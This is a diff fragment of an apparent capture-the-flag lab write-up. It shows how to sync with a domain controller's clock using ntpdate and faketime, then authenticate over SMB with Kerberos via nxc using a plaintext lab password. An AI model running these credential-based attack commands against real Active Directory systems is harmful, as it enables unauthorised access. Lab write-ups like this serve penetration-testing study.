@@ -321,5 +321,19 @@ SMB         10.129.232.60   445    DC               [-] absolute.htb\d.klay:Dark
 there is a restriction on the user, this could be because the user is protected users
 
 ```python
-
+ntpdate dc.absolute.htb                                     
+2026-08-16 23:08:44.097863 (+0100) +25195.459747 +/- 0.006589 dc.absolute.htb 10.129.232.60 s1 no-leap
+CLOCK: step_systime: Operation not permitted
 ```
+
+Ill read the time of the domain controller
+
+```python
+faketime '23:08:44.097863' nxc smb dc.absolute.htb -u d.klay -p 'Darkmoonsky248girl' -k
+SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl
+```
+
+Then ill sync with it, then us kerberos auth to bypass the restriction
+
+
